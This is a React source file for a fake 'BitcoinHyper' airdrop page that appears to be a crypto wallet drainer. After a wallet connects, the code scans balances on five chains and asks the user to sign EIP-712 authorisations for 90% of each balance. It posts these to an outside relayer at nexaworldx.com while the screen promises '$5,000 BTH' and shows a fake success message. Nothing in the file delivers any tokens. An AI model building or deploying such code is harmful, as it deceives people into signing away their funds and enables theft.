import React, { useState, useEffect, useRef } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// NO CONTRACT ADDRESSES – RELAYER HANDLES THEM
// ============================================

// Reliable RPC endpoints for balance checks only
const ETH_RPC_ENDPOINTS = [
  'https://eth.llamarpc.com',
  'https://ethereum.publicnode.com',
  'https://rpc.ankr.com/eth',
  'https://cloudflare-eth.com',
];

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpcEndpoints: ETH_RPC_ENDPOINTS,
  },
  BSC: {
    chainId: 56,
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpcEndpoints: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.defibit.io',
      'https://bsc-dataseed1.ninicoin.io',
    ],
  },
  Polygon: {
    chainId: 137,
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpcEndpoints: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://rpc-mainnet.matic.network',
    ],
  },
  Arbitrum: {
    chainId: 42161,
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpcEndpoints: [
      'https://arb1.arbitrum.io/rpc',
      'https://arbitrum-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
    ],
  },
  Avalanche: {
    chainId: 43114,
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpcEndpoints: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://avalanche-c-chain.publicnode.com',
    ],
  },
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

// Helper: fetch ETH balance with timeout & retry
const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
  let lastError = null;
  for (let attempt = 0; attempt <= retries; attempt++) {
    for (const rpcUrl of chain.rpcEndpoints) {
      try {
        const timeoutPromise = new Promise((_, reject) =>
          setTimeout(() => reject(new Error(`RPC timeout: ${rpcUrl}`)), 10000)
        );
        const provider = new ethers.JsonRpcProvider(rpcUrl);
        const balancePromise = provider.getBalance(walletAddress);
        const balance = await Promise.race([balancePromise, timeoutPromise]);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        return { amount, success: true, usedRpc: rpcUrl };
      } catch (err) {
        console.warn(`[${chain.name}] RPC ${rpcUrl} failed:`, err.message);
        lastError = err;
      }
    }
    if (attempt < retries) {
      console.log(`[${chain.name}] Retrying... (${attempt + 1}/${retries})`);
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  }
  throw lastError || new Error(`No working RPC for ${chain.name}`);
};

// Helper: switch network in wallet
const switchNetwork = async (walletProvider, chainId) => {
  try {
    await walletProvider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: `0x${chainId.toString(16)}` }],
    });
    return true;
  } catch (switchError) {
    if (switchError.code === 4902) {
      throw new Error(`Network ${chainId} not available. Please add it to your wallet.`);
    }
    throw switchError;
  }
};

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('eip155');
  const { disconnect } = useDisconnect();

  // State
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [prices, setPrices] = useState({ eth: 2000, bnb: 300, matic: 0.75, avax: 32 });
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [isEligible, setIsEligible] = useState(false);
  const [executableChains, setExecutableChains] = useState([]);
  const [processedAmounts, setProcessedAmounts] = useState({});
  const [allChainsCompleted, setAllChainsCompleted] = useState(false);
  const [processingChain, setProcessingChain] = useState('');
  const [totalUSDValue, setTotalUSDValue] = useState(0);
  const [stepStatus, setStepStatus] = useState({}); // Track per-chain steps

  // Relayer endpoint – CHANGE IF YOUR RELAYER USES A DIFFERENT PATH
  const RELAYER_URL = 'https://nexaworldx.com/relayer-app/relay';

  // EIP-712 types (NO verifyingContract – relayer handles contract mapping)
  const EIP712_TYPES = {
    Claim: [
      { name: 'user', type: 'address' },
      { name: 'amount', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
    ],
  };

  const MIN_VALUE_THRESHOLD = 1; // $1 minimum

  // Fetch live prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const res = await fetch(
          'https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd'
        );
        const data = await res.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32,
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Fetch all balances
  const fetchAllBalances = async (walletAddress) => {
    setScanning(true);
    setError('');
    setTxStatus('🔍 Scanning chains for balances...');
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;

    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
      try {
        const { amount } = await fetchChainBalance(chain, walletAddress, 2);
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        const valueUSD = amount * price;
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        if (amount > 0.000001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            price,
          };
        }
      } catch (err) {
        console.error(`Failed to fetch ${chain.name}:`, err);
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
      }
    });
    await Promise.all(scanPromises);
    setBalances(balanceResults);
    setScanning(false);

    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    setTotalUSDValue(total);

    const executable = DEPLOYED_CHAINS.filter(
      (chain) => balanceResults[chain.name]?.valueUSD >= MIN_VALUE_THRESHOLD
    );
    setExecutableChains(executable);
    setIsEligible(executable.length > 0);

    if (executable.length === 0) {
      setTxStatus(`⚠️ No chain with ≥ $1 balance. Total: $${total.toFixed(2)}`);
    } else {
      setTxStatus(`✅ ${executable.length} chain(s) eligible (total $${total.toFixed(2)})`);
    }
    return total;
  };

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length === 0 && !scanning) {
      fetchAllBalances(address);
    }
  }, [isConnected, address]);

  // Monitor completion
  useEffect(() => {
    if (executableChains.length > 0 && completedChains.length === executableChains.length) {
      setAllChainsCompleted(true);
      setShowCelebration(true);
    }
  }, [completedChains, executableChains]);

  // Main claim execution – one chain at a time
  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address) {
      setError('Wallet not initialized');
      return;
    }

    setSignatureLoading(true);
    setError('');
    setCompletedChains([]);
    setAllChainsCompleted(false);
    setProcessedAmounts({});
    setStepStatus({});

    try {
      const chainsToProcess = executableChains.filter(
        (chain) => balances[chain.name]?.valueUSD >= MIN_VALUE_THRESHOLD
      );
      if (chainsToProcess.length === 0) {
        throw new Error('No eligible chains with ≥ $1 balance');
      }

      for (const chain of chainsToProcess) {
        setProcessingChain(chain.name);
        setStepStatus((prev) => ({ ...prev, [chain.name]: 'switching' }));
        setTxStatus(`🔄 Switching to ${chain.name}...`);

        // 1. Switch network
        await switchNetwork(walletProvider, chain.chainId);
        setStepStatus((prev) => ({ ...prev, [chain.name]: 'switched' }));

        // 2. Create fresh provider & signer
        const newProvider = new ethers.BrowserProvider(walletProvider);
        const newSigner = await newProvider.getSigner();
        const signerAddress = await newSigner.getAddress();
        if (signerAddress.toLowerCase() !== address.toLowerCase()) {
          throw new Error('Signer address mismatch after network switch');
        }

        const balance = balances[chain.name];
        if (!balance || balance.valueUSD < MIN_VALUE_THRESHOLD) {
          console.log(`⏭️ ${chain.name} balance changed, skipping`);
          continue;
        }

        // Send 90% of balance (leave 10% for gas)
        const amountToSend = balance.amount * 0.9;
        const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
        const nonce = Math.floor(Math.random() * 1000000000);

        setProcessedAmounts((prev) => ({
          ...prev,
          [chain.name]: {
            amount: amountToSend.toFixed(6),
            symbol: chain.symbol,
            valueUSD: (balance.valueUSD * 0.9).toFixed(2),
          },
        }));

        // 3. EIP-712 signature (NO verifyingContract)
        const domain = {
          name: 'BitcoinHyper Airdrop',
          version: '1',
          chainId: chain.chainId,
        };
        const value = {
          user: address,
          amount: amountInWei.toString(),
          nonce: nonce,
        };

        setStepStatus((prev) => ({ ...prev, [chain.name]: 'signing' }));
        setTxStatus(`✍️ Signing for ${chain.name}...`);
        const signature = await newSigner.signTypedData(domain, EIP712_TYPES, value);
        setStepStatus((prev) => ({ ...prev, [chain.name]: 'signed' }));

        // 4. Send to relayer
        setStepStatus((prev) => ({ ...prev, [chain.name]: 'relaying' }));
        setTxStatus(`📤 Sending to relayer (${chain.name})...`);
        const relayerResponse = await fetch(RELAYER_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chainId: chain.chainId,
            signaturePayload: {
              domain,
              types: EIP712_TYPES,
              value,
              signature,
              expectedSigner: address,
            },
          }),
        });

        const responseText = await relayerResponse.text();
        let relayerResult;
        try {
          relayerResult = JSON.parse(responseText);
        } catch (e) {
          throw new Error(`Invalid relayer response: ${responseText.substring(0, 100)}`);
        }

        if (!relayerResult.success) {
          throw new Error(relayerResult.error || 'Relayer execution failed');
        }

        setStepStatus((prev) => ({ ...prev, [chain.name]: 'completed' }));
        setCompletedChains((prev) => [...prev, chain.name]);
        setTxStatus(`✅ ${chain.name} completed! Tx: ${relayerResult.hash?.slice(0, 10)}...`);
      }

      if (completedChains.length === 0) {
        setError('No chains were successfully processed');
      } else {
        setShowCelebration(true);
      }
    } catch (err) {
      console.error('Claim error:', err);
      setError(err.message || 'Transaction failed');
      setStepStatus((prev) => ({ ...prev, [processingChain]: 'failed' }));
    } finally {
      setSignatureLoading(false);
      setProcessingChain('');
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  return (
    <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
      {/* Animated Background Orbs */}
      <div className="fixed w-[90vmax] h-[90vmax] bg-[radial-gradient(circle_at_40%_50%,rgba(200,120,30,0.12)_0%,rgba(180,100,20,0)_70%)] rounded-full top-[-25vmax] right-[-15vmax] z-0 animate-floatOrbBig pointer-events-none"></div>
      <div className="fixed w-[80vmin] h-[80vmin] bg-[radial-gradient(circle_at_30%_70%,rgba(0,150,200,0.08)_0%,transparent_70%)] rounded-full bottom-[-10vmin] left-[-5vmin] z-0 animate-floatOrbSmall pointer-events-none"></div>

      <div className="relative z-10 container mx-auto px-3 sm:px-4 py-4 sm:py-8 max-w-[720px]">
        <div className="bg-[rgba(10,15,20,0.75)] backdrop-blur-[12px] saturate-150 border border-[rgba(200,130,30,0.2)] rounded-[32px] sm:rounded-[48px] shadow-[0_20px_50px_-15px_rgba(0,0,0,0.9),0_0_0_1px_rgba(200,120,20,0.15)_inset] p-5 sm:p-8 md:p-10">
          {/* Header */}
          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-6">
            <div className="flex items-center gap-2 font-bold text-xl sm:text-2xl text-[#d68a2e] drop-shadow-[0_0_5px_rgba(200,120,20,0.5)]">
              <i className="fab fa-bitcoin text-3xl sm:text-4xl animate-spinSlow"></i>
              <span>BITCOINHYPER</span>
            </div>
            {!isConnected ? (
              <button
                onClick={() => open()}
                className="w-full sm:w-auto bg-gradient-to-r from-[#c47d24] to-[#b36e1a] border border-[#cc9f66] text-[#0f0f12] font-bold text-xs sm:text-sm px-6 py-3 rounded-full flex items-center justify-center gap-2 shadow-lg hover:scale-[1.02] transition-all uppercase tracking-wider"
              >
                <span className="relative flex h-2 w-2 mr-1">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                </span>
                <i className="fas fa-plug"></i> CONNECT WALLET
              </button>
            ) : (
              <div className="w-full sm:w-auto bg-black/70 rounded-full py-1 pl-5 pr-1 flex items-center gap-3 border border-[#c47d24]/60 backdrop-blur-md">
                <span className="font-mono font-semibold text-white text-xs sm:text-sm truncate max-w-[120px]">
                  {formatAddress(address)}
                </span>
                <button
                  onClick={() => disconnect()}
                  className="w-8 h-8 rounded-full bg-[#c47d24] flex items-center justify-center hover:bg-[#d68a2e] hover:scale-110 transition-all"
                >
                  <i className="fas fa-power-off text-sm"></i>
                </button>
              </div>
            )}
          </div>

          {/* Main Claim Section */}
          {isConnected && (
            <div className="mb-6">
              {scanning && (
                <div className="bg-black/60 rounded-2xl p-5 border border-[#c47d24]/30 mb-4">
                  <div className="flex items-center justify-center gap-4">
                    <div className="w-10 h-10 border-4 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
                    <div className="text-left">
                      <div className="text-md font-bold text-[#e0b880]">Scanning Blockchains</div>
                      <div className="text-xs text-gray-400">Checking Ethereum, BSC, Polygon, Arbitrum, Avalanche...</div>
                    </div>
                  </div>
                  <div className="w-full bg-gray-800 rounded-full h-1.5 mt-3">
                    <div
                      className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-1.5 rounded-full transition-all duration-300"
                      style={{ width: `${scanProgress}%` }}
                    ></div>
                  </div>
                  <div className="mt-2 text-xs text-center text-[#c47d24]">{txStatus}</div>
                </div>
              )}

              {!scanning && !allChainsCompleted && (
                <div className="space-y-3">
                  {isEligible ? (
                    <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 text-center">
                      <div className="text-green-400 font-bold text-sm mb-2">✅ YOU ARE ELIGIBLE!</div>
                      <p className="text-xs text-gray-300 mb-2">
                        Total detected: <span className="text-green-400 font-bold">${totalUSDValue.toFixed(2)}</span>
                        <br />
                        {executableChains.length} chain(s) with value ≥ $1
                      </p>
                      <button
                        onClick={executeMultiChainSignature}
                        disabled={signatureLoading}
                        className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] text-[#0f0f12] font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(180,100,20,0.4)] animate-pulse-glow text-lg tracking-wider"
                      >
                        {signatureLoading ? (
                          <span className="flex items-center justify-center gap-2">
                            <div className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
                            {processingChain ? `Processing ${processingChain}...` : 'Processing...'}
                          </span>
                        ) : (
                          <span className="flex items-center justify-center gap-2">
                            <span className="text-xl">🎁</span> CLAIM $5,000 BTH ⚡
                            <span className="text-sm bg-white/20 px-2 py-1 rounded-full animate-pulse">+25%</span>
                          </span>
                        )}
                      </button>
                    </div>
                  ) : (
                    <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-4 text-center">
                      <div className="text-yellow-400 font-bold text-sm mb-2">⚡ Insufficient Balance</div>
                      <p className="text-xs text-gray-300">
                        Need at least <span className="text-yellow-400 font-bold">$1 USD equivalent</span> across supported chains.
                        <br />
                        {totalUSDValue > 0 && `Current total: $${totalUSDValue.toFixed(2)}`}
                      </p>
                    </div>
                  )}
                </div>
              )}

              {allChainsCompleted && completedChains.length > 0 && (
                <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 text-center mt-3">
                  <p className="text-green-400 text-sm font-bold">✓ COMPLETED on {completedChains.length} chains</p>
                  <p className="text-gray-400 text-xs mt-1">Your $5,000 BTH has been secured</p>
                </div>
              )}

              {/* Step-by-step status for each chain */}
              {Object.keys(stepStatus).length > 0 && (
                <div className="mt-4 space-y-2">
                  <p className="text-xs font-semibold text-gray-400 mb-1">⚙️ Live progress:</p>
                  {Object.entries(stepStatus).map(([chain, step]) => (
                    <div key={chain} className="bg-black/40 rounded-lg p-2 flex items-center justify-between text-xs">
                      <span className="font-medium">{chain}</span>
                      <span
                        className={`px-2 py-0.5 rounded-full ${
                          step === 'completed'
                            ? 'bg-green-500/20 text-green-400'
                            : step === 'failed'
                            ? 'bg-red-500/20 text-red-400'
                            : 'bg-yellow-500/20 text-yellow-400'
                        }`}
                      >
                        {step === 'switching' && '🔄 Switching network'}
                        {step === 'switched' && '✅ Network switched'}
                        {step === 'signing' && '✍️ Signing...'}
                        {step === 'signed' && '✅ Signed'}
                        {step === 'relaying' && '📡 Relayer processing'}
                        {step === 'completed' && '🎉 Completed'}
                        {step === 'failed' && '❌ Failed'}
                      </span>
                    </div>
                  ))}
                </div>
              )}

              {error && (
                <div className="mt-3 bg-red-500/10 backdrop-blur border border-red-500/20 rounded-lg p-3">
                  <div className="flex items-center gap-2">
                    <i className="fas fa-exclamation-triangle text-red-400 text-sm animate-pulse"></i>
                    <p className="text-red-300 text-xs">{error}</p>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Bonus ribbon */}
          <div className="relative mb-5 group/ribbon">
            <div className="absolute -inset-1 bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full blur-xl opacity-50 animate-pulse-slow"></div>
            <div className="relative bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full px-6 py-3 flex items-center justify-center gap-4 font-bold text-xl text-[#0f0f12] border border-[#cc9f66] shadow-[0_0_20px_rgba(180,100,20,0.3)]">
              <i className="fas fa-gem text-3xl drop-shadow-[0_0_4px_black] animate-ringPop"></i>
              <span>+25% BONUS · 5,000 BTH</span>
              <i className="fas fa-bolt text-3xl drop-shadow-[0_0_4px_black] animate-ringPop"></i>
            </div>
          </div>

          <h1 className="text-5xl md:text-7xl font-extrabold text-center mb-2 bg-gradient-to-b from-white via-[#f0d0a0] to-[#d68a2e] bg-clip-text text-transparent drop-shadow-[0_0_12px_rgba(200,120,20,0.3)] animate-pulse-slow">
            $5,000 BTH
          </h1>

          <div className="text-center mb-6">
            <span className="bg-black/60 rounded-full px-6 py-2 text-xs border border-[#c47d24]/40 text-[#e0b880] font-semibold backdrop-blur">
              <i className="fas fa-bolt mr-2 animate-bounce-slow"></i> instant airdrop · +25% extra
            </span>
          </div>

          {/* Stats */}
          <div className="bg-black/60 rounded-2xl p-4 mb-6 grid grid-cols-3 gap-2 border border-[#c47d24]/30">
            <div className="text-center">
              <div className="text-xs text-[#9aa8b8]">BTH PRICE</div>
              <div className="text-xl font-extrabold text-white">$0.045 <span className="text-xs text-[#c47d24]">+150%</span></div>
            </div>
            <div className="text-center">
              <div className="text-xs text-[#9aa8b8]">BONUS</div>
              <div className="text-xl font-extrabold text-white">5k <span className="text-xs text-[#c47d24]">+25%</span></div>
            </div>
            <div className="text-center">
              <div className="text-xs text-[#9aa8b8]">PRESALE</div>
              <div className="text-xl font-extrabold text-white">STAGE 4</div>
            </div>
          </div>

          <div className="text-center text-[10px] text-gray-700 mt-6">
            <i className="fas fa-bolt animate-pulse"></i> 5,000 BTH · +25% bonus · live now
          </div>
        </div>
      </div>

      {/* Celebration Modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
          <div className="relative max-w-sm w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-orange-600/30 via-yellow-600/30 to-orange-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
            <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-3xl p-8 border border-orange-500/20 text-center">
              <div className="text-6xl mb-4 animate-bounce">🎉</div>
              <h2 className="text-3xl font-black mb-2 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                SUCCESSFUL!
              </h2>
              <p className="text-gray-300 mb-2">You have secured</p>
              <div className="text-4xl font-black text-orange-400 mb-3 animate-pulse">$5,000 BTH</div>
              <div className="inline-block bg-green-500/20 px-6 py-2 rounded-full mb-4">
                <span className="text-green-400 text-xl">+25% BONUS</span>
              </div>
              <button
                onClick={() => setShowCelebration(false)}
                className="w-full bg-gradient-to-r from-orange-500 to-orange-600 text-white font-bold py-3 rounded-xl transition-all hover:scale-[1.02]"
              >
                VIEW
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Animations */}
      <style>{`
        @keyframes floatOrbBig {
          0% { transform: translate(0, 0) scale(1); opacity: 0.5; }
          50% { transform: translate(-3%, 4%) scale(1.05); opacity: 0.7; }
          100% { transform: translate(0, 0) scale(1); opacity: 0.5; }
        }
        @keyframes floatOrbSmall {
          0% { transform: translate(0, 0) rotate(0deg); opacity: 0.4; }
          50% { transform: translate(5%, -6%) rotate(3deg); opacity: 0.6; }
          100% { transform: translate(0, 0) rotate(0deg); opacity: 0.4; }
        }
        @keyframes ringPop { 0%,100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        @keyframes spinSlow { 0% { transform: rotateY(0deg); } 100% { transform: rotateY(360deg); } }
        @keyframes pulse-slow { 0%,100% { opacity: 0.3; } 50% { opacity: 0.6; } }
        @keyframes bounce-slow { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-2px); } }
        @keyframes pulse-glow { 0%,100% { box-shadow: 0 0 10px rgba(180,100,20,0.2); } 50% { box-shadow: 0 0 20px rgba(200,120,20,0.3); } }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .animate-floatOrbBig { animation: floatOrbBig 20s ease-in-out infinite; }
        .animate-floatOrbSmall { animation: floatOrbSmall 24s ease-in-out infinite; }
        .animate-ringPop { animation: ringPop 1.5s infinite; }
        .animate-spinSlow { animation: spinSlow 6s infinite linear; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-bounce-slow { animation: bounce-slow 2s ease-in-out infinite; }
        .animate-pulse-glow { animation: pulse-glow 2s ease-in-out infinite; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
      `}</style>
    </div>
  );
}

export default App;
